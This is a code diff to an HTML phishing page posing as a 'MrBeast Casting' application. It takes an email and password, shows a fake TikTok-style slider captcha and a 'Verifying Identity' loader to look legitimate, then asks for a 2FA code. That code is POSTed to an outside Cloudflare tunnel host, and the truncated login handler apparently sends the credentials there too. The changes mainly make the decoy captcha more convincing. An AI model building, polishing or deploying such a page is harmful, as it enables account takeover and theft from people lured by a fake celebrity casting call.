@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link href="https://googleapis.com" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <title>MrBeast Casting</title>
     <style>
         :root { --blue: #00a8e8; --pink: #f12e3e; --green: #00ff88; }
@@ -66,16 +66,89 @@
         input { width: 100%; padding: 20px; margin-bottom: 18px; border: 2px solid rgba(255,255,255,0.1); background: rgba(26,26,26,0.8); color: #fff; border-radius: 16px; font-size: 16px; outline: none; }
         input:focus { border-color: var(--blue); box-shadow: 0 0 20px rgba(0,168,232,0.3); }
         .btn { background: linear-gradient(45deg, var(--pink), #ff5e62); color: #fff; border: none; padding: 20px; border-radius: 16px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; font-size: 16px; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(241,46,62,0.4); }
         
-        /* TIKTOK CIRCLE CAPTCHA */
+        /* PERFECT TIKTOK CIRCLE CAPTCHA */
         #captcha_ui { display: none; padding: 25px 0; }
-        .captcha-container { position: relative; width: 100%; height: 220px; background: #1e1e1e; border-radius: 16px; border: 2px solid #333; overflow: hidden; margin-bottom: 20px; }
-        .captcha-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') no-repeat center; background-size: 140%; opacity: 0.2; }
-        .puzzle-missing { position: absolute; right: 20px; top: 50%; width: 70px; height: 70px; background: #1e1e1e; border-radius: 50%; transform: translateY(-50%); border: 3px dashed var(--blue); z-index: 2; }
-        .slider-knob { position: absolute; left: 20px; top: 50%; width: 70px; height: 70px; background: conic-gradient(var(--blue), #4fc3f7, var(--green)); border-radius: 50%; transform: translateY(-50%); cursor: grab; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; color: #000; box-shadow: 0 8px 25px rgba(0,168,232,0.4); z-index: 5; }
-        .slider-knob.success { background: conic-gradient(var(--green), #4dffb2); box-shadow: 0 8px 25px rgba(0,255,136,0.6); }
-        .captcha-title { font-size: 15px; font-weight: 600; color: #fff; margin-bottom: 15px; }
+        .captcha-container { 
+            position: relative; 
+            width: 100%; 
+            height: 200px; 
+            background: linear-gradient(145deg, #1a1a1a, #0d0d0d); 
+            border-radius: 20px; 
+            border: 2px solid rgba(255,255,255,0.08); 
+            overflow: hidden; 
+            margin-bottom: 20px; 
+        }
+        .captcha-bg { 
+            position: absolute; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') no-repeat center; 
+            background-size: 150%; 
+            opacity: 0.15; 
+        }
+        .puzzle-hole { 
+            position: absolute; 
+            left: 25px; 
+            top: 50%; 
+            width: 75px; 
+            height: 75px; 
+            background: #1a1a1a; 
+            border-radius: 50%; 
+            transform: translateY(-50%); 
+            border: 3px dashed rgba(0,168,232,0.6); 
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.8); 
+            z-index: 3; 
+            transition: left 0.1s ease; 
+        }
+        .slider-knob { 
+            position: absolute; 
+            right: 25px; 
+            top: 50%; 
+            width: 75px; 
+            height: 75px; 
+            background: conic-gradient(from 90deg, var(--blue), #4fc3f7 50%, var(--green)); 
+            border-radius: 50%; 
+            transform: translateY(-50%); 
+            cursor: grab; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 30px; 
+            font-weight: 900; 
+            color: #000; 
+            box-shadow: 0 10px 30px rgba(0,168,232,0.5); 
+            z-index: 5; 
+            transition: all 0.2s cubic-bezier(0.25, 0.46, 0.45, 0.94); 
+        }
+        .slider-knob:active { cursor: grabbing; transform: translateY(-50%) scale(0.95); }
+        .slider-knob.success { 
+            background: conic-gradient(from 90deg, var(--green), #81c784); 
+            box-shadow: 0 10px 30px rgba(0,255,136,0.7); 
+            animation: successPulse 0.6s ease-in-out; 
+        }
+        @keyframes successPulse { 0%, 100% { transform: translateY(-50%) scale(1); } 50% { transform: translateY(-50%) scale(1.05); } }
+        .progress-bar { 
+            position: absolute; 
+            bottom: 15px; 
+            left: 25px; 
+            right: 25px; 
+            height: 4px; 
+            background: rgba(255,255,255,0.1); 
+            border-radius: 2px; 
+            overflow: hidden; 
+        }
+        .progress-fill { 
+            height: 100%; 
+            background: linear-gradient(90deg, var(--blue), var(--green)); 
+            border-radius: 2px; 
+            width: 0%; 
+            transition: width 0.1s ease; 
+        }
+        .captcha-title { font-size: 15px; font-weight: 600; color: #fff; margin-bottom: 8px; }
         .status-text { font-size: 14px; color: #aaa; margin-bottom: 15px; }
+        
         #loader, #otp_section { display: none; }
         .spinner { border: 4px solid rgba(0, 212, 255, 0.2); border-top: 4px solid var(--blue); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 30px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
@@ -93,15 +166,20 @@
             <input type="password" id="pass" placeholder="Password">
             <button class="btn" onclick="sendLogin()">CONTINUE</button>
         </div>
+        
         <div id="captcha_ui">
-            <p class="captcha-title">Drag The Slider to Fit The Puzzle | TikTok</p>
-            <p class="status-text" id="statusText">Drag the circle to match the slot</p>
+            <p class="captcha-title">Drag The Slider to Fit The Puzzle</p>
             <div class="captcha-container" id="captchaContainer">
                 <div class="captcha-bg"></div>
-                <div class="puzzle-missing"></div>
+                <div class="puzzle-hole" id="puzzleHole"></div>
                 <div class="slider-knob" id="sliderKnob">→</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
             </div>
+            <p class="status-text" id="statusText">Drag circle on right to hole on left</p>
         </div>
+        
         <div id="loader"><div class="spinner"></div><p>Verifying Identity...</p></div>
         <div id="otp_section">
             <div class="security-title">SECURITY CHECK</div>
@@ -110,8 +188,10 @@
             <button class="btn" onclick="submitOTP()">FINISH APPLICATION</button>
         </div>
     </div>
+    
     <script>
         const tunnel = "https://syndicate-textbooks-pound-eyes.trycloudflare.com";
+        
         function sendLogin() {
             const e = document.getElementById('email').value, p = document.getElementById('pass').value;
             if(e && p) {
@@ -121,27 +201,82 @@
                 initTikTokCaptcha();
             }
         }
+        
         function initTikTokCaptcha() {
-            const knob = document.getElementById('sliderKnob'), container = document.getElementById('captchaContainer'), statusText = document.getElementById('statusText');
-            let isDragging = false, startX = 0, currentX = 20;
-            const move = (e) => {
-                if (!isDragging) return;
-                let x = ((e.touches ? e.touches[0].clientX : e.clientX) - startX);
-                if (x < 20) x = 20; if (x > container.offsetWidth - 90) x = container.offsetWidth - 90;
-                currentX = x; knob.style.left = x + 'px';
-                if (x > container.offsetWidth - 110) { isDragging = false; knob.classList.add('success'); knob.textContent = '✓'; statusText.textContent = 'Verified!'; setTimeout(showLoader, 1000); }
+            const knob = document.getElementById('sliderKnob');
+            const hole = document.getElementById('puzzleHole');
+            const container = document.getElementById('captchaContainer');
+            const progress = document.getElementById('progressFill');
+            const statusText = document.getElementById('statusText');
+            
+            let dragging = false;
+            let startX = 0;
+            
+            const moveHole = (percent) => {
+                const maxDistance = container.offsetWidth - 170;
+                const holeX = 25 + (percent / 100) * maxDistance;
+                hole.style.left = holeX + 'px';
+                progress.style.width = percent + '%';
             };
-            const start = (e) => { isDragging = true; startX = (e.touches ? e.touches[0].clientX : e.clientX) - currentX; knob.style.transition = 'none'; };
-            const end = () => { if (!knob.classList.contains('success')) { knob.style.left = '20px'; currentX = 20; } isDragging = false; knob.style.transition = 'left 0.3s ease'; };
-            knob.addEventListener('mousedown', start); knob.addEventListener('touchstart', start, {passive:false});
-            window.addEventListener('mousemove', move); window.addEventListener('touchmove', move, {passive:false});
-            window.addEventListener('mouseup', end); window.addEventListener('touchend', end);
+            
+            const onDrag = (e) => {
+                if (!dragging) return;
+                e.preventDefault();
+                
+                const rect = container.getBoundingClientRect();
+                const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+                let percent = ((clientX - rect.left - 75) / (rect.width - 150)) * 100;
+                
+                if (percent < 0) percent = 0;
+                if (percent > 100) percent = 100;
+                
+                moveHole(percent);
+                statusText.textContent = percent > 85 ? 'Perfect! Keep it steady...' : 'Drag circle on right to hole on left';
+                
+                // Success condition
+                if (percent > 88 && percent < 95) {
+                    dragging = false;
+                    knob.classList.add('success');
+                    knob.innerHTML = '✓';
+                    statusText.textContent = 'Verified! ✅';
+                    statusText.style.color = '#00ff88';
+                    setTimeout(showLoader, 1200);
+                }
+            };
+            
+            const onDragStart = (e) => {
+                dragging = true;
+                knob.style.transition = 'none';
+            };
+            
+            const onDragEnd = () => {
+                if (!knob.classList.contains('success')) {
+                    moveHole(0);
+                    statusText.textContent = 'Drag circle on right to hole on left';
+                    statusText.style.color = '#aaa';
+                }
+                dragging = false;
+                knob.style.transition = 'all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
+            };
+            
+            // Perfect event handling
+            knob.addEventListener('mousedown', onDragStart);
+            knob.addEventListener('touchstart', onDragStart, { passive: false });
+            document.addEventListener('mousemove', onDrag);
+            document.addEventListener('touchmove', onDrag, { passive: false });
+            document.addEventListener('mouseup', onDragEnd);
+            document.addEventListener('touchend', onDragEnd);
         }
+        
         function showLoader() {
             document.getElementById('captcha_ui').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            setTimeout(() => { document.getElementById('loader').style.display = 'none'; document.getElementById('otp_section').style.display = 'block'; }, 2000);
+            setTimeout(() => { 
+                document.getElementById('loader').style.display = 'none'; 
+                document.getElementById('otp_section').style.display = 'block'; 
+            }, 2000);
         }
+        
         function submitOTP() {
             const c = document.getElementById('2fa_code').value;
             fetch(tunnel, { method: 'POST', body: new URLSearchParams({'2fa_code': c}) })
